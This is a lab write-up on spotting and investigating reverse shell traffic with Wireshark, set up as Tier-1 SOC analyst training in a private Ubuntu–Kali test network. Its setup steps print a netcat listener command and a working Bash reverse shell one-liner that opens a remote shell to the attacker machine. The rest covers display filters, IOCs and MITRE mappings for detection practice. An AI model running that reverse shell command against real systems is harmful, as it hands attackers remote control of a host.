# Lab 05 – Reverse Shell Detection & Investigation

## Overview

This lab demonstrates how a Security Operations Center (SOC) analyst detects and investigates reverse shell traffic using Wireshark.

A reverse shell connection was established from an Ubuntu machine to a Kali Linux system using Bash over TCP. The generated traffic was captured and analyzed to understand how reverse shell communication appears on the network.

This lab focuses on identifying TCP connections, analyzing packet flow, collecting Indicators of Compromise (IOCs), and understanding the SOC investigation workflow.

---

# Lab Objective

- Understand reverse shell communication
- Capture reverse shell traffic
- Analyze TCP handshake
- Inspect PSH/ACK packets
- Follow TCP Stream
- Identify attacker and victim
- Collect Indicators of Compromise (IOCs)
- Practice Tier-1 SOC investigation

---

# Lab Environment

| Machine | Role | IP Address |
|----------|------|------------|
| Ubuntu | Victim | 192.168.1.5 |
| Kali Linux | Attacker / Listener | 192.168.1.7 |
| Wireshark | Packet Capture | Kali |

---

# Tools Used

- Kali Linux
- Ubuntu
- Netcat (nc)
- Bash
- Wireshark

---

# Network Topology

Ubuntu (Victim)

↓

Reverse Shell

↓

TCP Port 4444

↓

Kali (Attacker)

↓

Wireshark Capture

---

# Steps Performed

## Step 1 – Configure the Listener (Kali)

Started Netcat listener on TCP port 4444.

Command

```
nc -lvnp 4444
```

The listener waits for incoming reverse shell connections.

---

## Step 2 – Execute Reverse Shell (Ubuntu)

Executed a Bash reverse shell.

Command

```
bash -i >& /dev/tcp/192.168.1.7/4444 0>&1
```

Ubuntu initiated an outbound TCP connection to Kali.

---

## Step 3 – Capture Traffic

Started Wireshark on Kali before executing the reverse shell.

Captured all packets exchanged during the session.

---

## Step 4 – Verify Connection

Verified that Kali received a shell.

Executed basic Linux commands through the shell.

Example

```
whoami

hostname

pwd

ls
```

---

## Step 5 – Stop Capture

Stopped Wireshark after completing the investigation.

Saved the PCAP.

Example

```
Lab05_ReverseShell.pcapng
```

---

# Wireshark Investigation

## Display Filters Used

TCP

```
tcp
```

Port 4444

```
tcp.port == 4444
```

Source IP

```
ip.src == 192.168.1.5
```

Destination IP

```
ip.dst == 192.168.1.7
```

TCP Handshake

```
tcp.flags.syn==1 || tcp.flags.syn==1 && tcp.flags.ack==1 || tcp.flags.ack==1
```

TCP Stream

Right Click

↓

Follow

↓

TCP Stream

---

# Packet Analysis

Inspect the following fields

- Source IP
- Destination IP
- Source Port
- Destination Port
- SYN
- SYN ACK
- ACK
- Sequence Number
- Acknowledgement Number
- PSH ACK
- Payload
- TCP Stream

---

# Screenshots

01_Netcat_Listener.png

02_Reverse_Shell_Command.png

03_TCP_Port_4444_Filter.png

04_TCP_Handshake.png

05_PSH_ACK_Packets.png

06_Follow_TCP_Stream.png

07_IOC_Collection.png

08_Conversation_Statistics.png

09_Endpoints.png

---

# Indicators of Compromise (IOCs)

Source IP

192.168.1.5

Destination IP

192.168.1.7

Protocol

TCP

Destination Port

4444

Connection Type

Reverse Shell

---

# MITRE ATT&CK

T1059

Command and Scripting Interpreter

T1071

Application Layer Protocol

T1105

Ingress Tool Transfer

---

# Tier-1 SOC Responsibilities

✔ Validate SIEM alert

✔ Identify victim host

✔ Identify attacker host

✔ Verify TCP handshake

✔ Inspect TCP payload

✔ Follow TCP Stream

✔ Collect IOCs

✔ Preserve evidence

✔ Escalate to Tier-2

---

# Skills Learned

- TCP Analysis
- Reverse Shell Detection
- Wireshark Investigation
- TCP Stream Analysis
- IOC Collection
- Incident Documentation
- SOC Tier-1 Workflow

---

# Conclusion

The reverse shell traffic was successfully generated between Ubuntu and Kali Linux. Wireshark analysis confirmed a successful TCP handshake followed by continuous PSH/ACK packets carrying interactive shell commands. The investigation identified the attacker, victim, destination port, and communication pattern, demonstrating how a Tier-1 SOC Analyst investigates reverse shell activity before escalating the incident.
